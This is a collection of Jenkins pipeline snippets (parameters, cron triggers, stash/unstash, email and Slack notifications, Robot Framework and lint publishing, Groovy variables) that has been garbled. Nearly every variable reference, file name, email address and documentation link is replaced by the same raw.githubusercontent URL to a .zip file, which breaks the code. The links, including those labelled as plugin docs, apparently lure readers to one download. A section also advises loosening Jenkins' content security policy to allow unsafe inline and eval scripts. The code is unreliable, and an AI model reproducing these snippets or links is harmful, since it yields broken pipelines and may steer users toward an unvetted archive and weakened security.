Jenkins Pipeline Examples (by kitconcept)
==============================================================================

Options
-------

Disable concurrent builds::

  pipeline {

    agent any

    options {
      disableConcurrentBuilds()
    }
    ...
  }

Set global timeout::

  options {
    timeout(time: 30, unit: 'MINUTES')
  }

Discard old builds and artifacts::

  options {
    buildDiscarder(logRotator(numToKeepStr: '30', artifactNumToKeepStr: '30'))
  }

Parameters
----------

Jenkins allows to ask the user for job paremeters before the job execution.
Possible parameters are boolean, choice, file, text, password, run, or string::

  pipeline {
      agent any

      parameters {
          booleanParam(defaultValue: true, description: '', name: 'booleanExample')
          string(defaultValue: "TEST", description: 'What environment?', name: 'stringExample')
          text(defaultValue: "This is a multiline\n text", description: "Multiline Text", name: "textExample")
          choice(choices: 'US-EAST-1\nUS-WEST-2', description: 'What AWS region?', name: 'choiceExample')
          password(defaultValue: "Password", description: "Password Parameter", name: "passwordExample")
      }

      stages {
          stage("my stage") {
              steps {
                  echo "booleanExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
                  echo "stringExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
                  echo "textExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
                  echo "choiceExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
                  echo "passwordExample: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}"
              }
          }
      }
  }

Triggers / Scheduling
---------------------

Trigger build regularly with cron::

  pipeline {
      agent any
      triggers {
          cron('H */4 * * 1-5')
      }
      stages {
          stage('Example') {
              steps {
                  echo 'Hello World'
              }
          }
      }
  }

Triggers Pipeline Syntax docs: `https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip`_.

Paremeterized Trigger / Cron::

  pipeline {
      agent any
      parameters {
        string(name: 'PLANET', defaultValue: 'Earth', description: 'Which planet are we on?')
        string(name: 'GREETING', defaultValue: 'Hello', description: 'How shall we greet?')
      }
      triggers {
          cron('* * * * *')
          parameterizedCron('''
  # leave spaces where you want them around the parameters. They'll be trimmed.
  # we let the build run with the default name
  */2 * * * * %GREETING=Hola;PLANET=Pluto
  */3 * * * * %PLANET=Mars
          ''')
      }
      stages {
          stage('Example') {
              steps {
                  echo "${GREETING} ${PLANET}"
                  script { https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip = "${GREETING} ${PLANET}" }
              }
          }
      }
  }

Git Checkout
------------

Git Checkout::

  checkout scm

The Jenkinsfile job configuration already contains the repository URL. Therefore a checkout is as simple as that. See `this <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_ for details.


Clean Workspace
---------------

Clean workspace::

  deleteDir()

See `Jenkins workflow basic steps docs <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_ for more details.


Pipeline / Distributed Build
----------------------------

Jenkins allows to create pipeline steps that are automatically distributed across the available nodes.

Create pipeline steps::

  stage('Build') {
    node {
      ...
    }
  }

  stage('Test') {
    node {
      ...
    }
  }

Stash/Unstash
^^^^^^^^^^^^^

Use stash/unstash to share data between pipelines::

  stage('Build') {
    node {
      checkout scm
      sh "npm install"
      stash includes: 'node_modules/', name: 'node_modules'
    }
  }

  stage('Test') {
    node {
      unstash 'node_modules'
      sh "npm run test"
    }
  }

The 'Build' pipeline step checks out the repository and runs 'npm install'. The build artifacts in 'node_modules' are stashed for later pipeline steps to be used.

The 'Test' pipeline steps unstashes the 'node_modules' stash (lookup by name) and allows to use it (e.g. to run tests on the installed modules).

Note that files are discarded at the end of the build. If you want to keep the artifacts use 'stash/unstash'.

Artifacts
^^^^^^^^^

Archive artifacts at the end of the job::

    post {
        always {
            archiveArtifacts artifacts: 'build/libs/**/*.jar', fingerprint: true, allowEmptyArchive: true
        }
   }

"allowEmptyArchive: true" makes the build not fail when no artifacts are found. "fingerprint: true" allows to track artifacts over nodes.

Clean Workspace
^^^^^^^^^^^^^^^

In order to start with a clean build it is essential to clear the workspace before a checkout or an unstash::

  stage('Build') {
    node {
      deleteDir()
      checkout scm
      sh "npm install"
      stash includes: 'node_modules/', name: 'node_modules'
    }
  }

  stage('Test') {
    node {
      deleteDir()
      unstash 'node_modules'
      sh "npm run test"
    }
  }

When dealing with build artifacts with lots of file (e.g. node_modules or buildout) stashing/unstashing can take quite a while.


Declarative Pipeline
--------------------

Cloudbees announced a new declarative pipeline syntax in December 2016:

https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip%3A+ContinuousBlog+%28Jenkins%29

https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip%20started

https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

This allows to write a cleaner pipeline::

  #!groovy
  pipeline {
    stages {
      stage('Build') {
        node {
          checkout scm
        }
      }

      stage('Static Code Analysis') {
        node() {
          sh "echo 'Run Static Code Analysis'"
        }
      }

      stage('Unit Tests') {
        node() {
          sh "echo 'Run Tests'"
        }
      }

      stage('Acceptance Tests') {
        node() {
          sh "echo 'Run Acceptance Tests'"
        }
      }
    }
    post {
      always {
        deleteDir()
      }
      success {
        mail to:"https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip", subject:"SUCCESS: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}", body: "Yay, we passed."
      }
      failure {
        mail to:"https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip", subject:"FAILURE: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}", body: "Boo, we failed."
      }
    }
  }

Declarative Pipeline Post Actions (global)::

  #!groovy
  pipeline {
    stages {
      ...
    }
    post {
      // always means, well, always run.
      always {
        echo "Hi there"
      }
      // changed means when the build status is different than the previous build's status.
      changed {
        echo "I'm different"
      }
      // success, failure, unstable all run if the current build status is successful, failed, or unstable, respectively
      success {
        echo "I succeeded"
        archive "**/*"
      }
    }
  }

Declarative Pipeline Post Actions (stage)::

  #!groovy
  pipeline {
    stages {
      stage("first stage") {
        when { ... }
        post {
          // always means, well, always run.
          always {
            echo "Hi there"
          }
          // changed means when the build status is different than the previous build's status.
          changed {
            echo "I'm different"
          }
          // success, failure, unstable all run if the current build status is successful, failed, or unstable, respectively
          success {
            echo "I succeeded"
            archive "**/*"
          }
        }
      }
    }
  }

Post action docs: https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

Declarative Pipeline Parallel Build Steps::

  // --- STATIC CODE ANALYSIS ---
  stage('Static Code Analysis') {
    parallel {
      stage('Backend') {
        agent {
          label "node"
        }
        steps {
          sh "ls -al"
          }
        }
      }
      stage('Frontend') {
        agent {
          label "node"
        }
        steps {
            sh "ls -al"
          }
        }
      }
    }
  }


Test Results
------------

Include jUnit-based test results::

  sh "bin/test"
  step([
    $class: 'JUnitResultArchiver',
    testResults: 'parts/test/testreports/*.xml'
  ])


Email Notifications
-------------------

Send email notifications::

  emailext (
    to: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    subject: "${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} [${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}]",
    body: "Build URL: ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}.\n\n",
    attachLog: true,
  )

Send email notifications to build requester and/or committers since last successful build::

  emailext (
    subject: "FAILURE: #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}",
    body: "Hey, it seems one of your recent commits broke the build, please check ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}.",
    attachLog: true,
    recipientProviders: [[$class: 'RequesterRecipientProvider'], [$class:'CulpritsRecipientProvider']]
  )
      
Requires `Email-ext Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+plugin>`_.

Slack Notifications
-------------------

Add Slack notification::

  slackSend channel: '#general', color: 'good', message: '[${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}] #${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip} ${https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip}', teamDomain: 'kitconcept', token: '<ADD-TOKEN-HERE>'

Tutorial how to set up Jenkins and Slack: https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

Robot Framework
---------------

Publish Robot Framework test results::

  sh "pybot tests/acceptance"
  step([$class: 'RobotPublisher',
    disableArchiveOutput: false,
    logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    otherFiles: '',
    outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    outputPath: '.',
    passThreshold: 100,
    reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    unstableThreshold: 0]);

Requires `Robot Framework Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Framework+Plugin>`_.

Running Robot Framework test with Selenium requires wrapping the test execution into an Xvfb wrapper::

  wrap([$class: 'Xvfb']) {
    sh ".env/bin/pybot tests/acceptance"
    step([$class: 'RobotPublisher',
      disableArchiveOutput: false,
      logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
      otherFiles: '',
      outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
      outputPath: '.',
      passThreshold: 100,
      reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
      unstableThreshold: 0]);
  }

Robot for Plone::

  bin/test --all --xml
  step([
    $class: 'RobotPublisher',
    disableArchiveOutput: false,
    logFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    onlyCritical: true,
    otherFiles: '**/*.png',
    outputFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    outputPath: 'parts/test',
    passThreshold: 100,
    reportFileName: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    unstableThreshold: 0
  ]);

Port Allocation
---------------

In order to scale Jenkins, your builds need to be able to run in parallel. You can use containers to isolate the builds or allocate ports for each job/test run::

  sh ".env/bin/pybot --variable PORT=\$(python -c \"import socket; s = https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip, https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip); https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(('', 0)); print(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip()[1])\") tests/acceptance"

The `Port Allocator Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Allocator+Plugin>`_ is currently not compatible with pipeline jobs. Therefore we use a simple Python script to do the trick (make sure you have a Python interpreter on your machine).


Static Code Analysis
--------------------

Pep8/Flake8:

  timeout(time: 5, unit: 'MINUTES') {
    sh 'bin/code-analysis'
    step([$class: 'WarningsPublisher',
      parserConfigurations: [[
        parserName: 'Pep8',
        pattern: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip'
      ]],
      unstableTotalAll: '0',
      usePreviousBuildAsReference: true
    ])
  }

We use the 'Pep8' parser and the pattern is the path to the log file created by either pep8 or flake8. 'unstableTotalAll' = 0 makes sure the build is marked unstable if there is a single violation. If you want the build to fail on violations, use "failedTotalAll: '0'". It is not recommended to use any other threshold than '0' for those settings.

TSLint::

  timeout(time: 5, unit: 'MINUTES') {
    sh 'npm run lint:ci'
    step([$class: 'WarningsPublisher',
      parserConfigurations: [[
        parserName: 'JSLint',
        pattern: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip'
      ]],
      unstableTotalAll: '0',
      usePreviousBuildAsReference: true
    ])
  }

Requires `Warnings Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_.

There is no documentation whatsoever available of how to use this plugin with Jenkins pipelines. See this `github commit <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>`_. for details.


Linting
-------

Publish ESLint report::

  sh "npm run lint"
  step([$class: 'CheckStylePublisher',
    pattern: '**https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
    unstableTotalAll: '0',
    usePreviousBuildAsReference: true])

Requires `Checkstyle Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_.

I used the `Violations Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip>` before but this plugin is not compatible with pipeline jobs and it seems it became unmaintained.


HTML Reports
------------

Publish HTML::

    publishHTML (target: [
      allowMissing: false,
      alwaysLinkToLastBuild: false,
      keepAll: true,
      reportDir: 'docs/_build',
      reportFiles: 'https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip',
      reportName: "Developer Documentation"
    ])

Requires `HTML Publisher Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Publisher+Plugin>`_.

For some reports, such as lighthouse you need to relax the content security policy in your /etc/default/jenkins file:

```
JAVA_ARGS="https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip\"sandbox allow-scripts; default-src *; style-src * http://* 'unsafe-inline' 'unsafe-eval'; script-src 'self' http://* 'unsafe-inline' 'unsafe-eval'; img-src 'self' data:\""
```

Code Coverage
-------------

The Cobertura plugin is not there yet:

https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

You can use the HTML publisher plugin instead though.


Timeouts
--------

Tests or build steps are sometimes stuck because of issues beyond our control. Therefore it makes sense to kill a build if it is stuck. For traditional Jenkins jobs there is the `Build-timeout Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Plugin>`_. Though, pipelines give us a far more fine-grained control::

  timeout(time: 5, unit: 'MINUTES') {
    ...
  }


Lock Resources
--------------

Lock a resource that requires exclusive access::

  lock('my-resource-name') {
    echo 'Do something here that requires unique access to the resource'
    // any other build will wait until the one locking the resource leaves this block
  }

Requires `Lockable Resources Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Resources+Plugin>`_.

Lock multiple stages in a declarative pipeline::

  stage('Parent') {
    options {
      lock('myLock')
    }
    stages {
      stage('first child') {
        ...
      }
      stage('second child') {
        ...
      }
    }
  }

NOT THERE YET! https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

Icons/Badges
------------

The  `Groovy Postbuild Plugin <https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip+Postbuild+Plugin>`_ allows to annotate builds with icons or badges. E.g. add a version badge to the build::

  version=readFile('https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip')
  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("${version}")

Add warnings badge to the build::

  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("Deployment to https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip failed!")

Add warning message to the detailed build view::

  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip("https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip").appendText("<h1>Deployment to https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip failed!</h1>", false, false, false, "red")

Groovy Variables
----------------

Load file content into Groovy variable::

  version=readFile('https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip')

Use Groovy variable::

  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip = 'VNCuxf Mail (${version})'

Declarative Pipeline::

  script {
    VERSION = sh(
      script: 'cat https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip | python -c "import sys, json; print https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip(https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip)[\'version\']"',
      returnStdout: true
  ).trim()

  sh "echo VERSION"
  sh "echo ${VERSION}"

Declarative Pipeline (ignore exit code)::

  script {
    psiExitCode = sh(
      script: 'yarn run psi',
      returnStdout: true,
      returnStatus: true
    )
  }


Global Variables
----------------

Current Build::

  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip

Environment::

  https://raw.githubusercontent.com/mohanpeddayyagri/jenkins-pipeline-examples/master/approximation/jenkins-pipeline-examples.zip
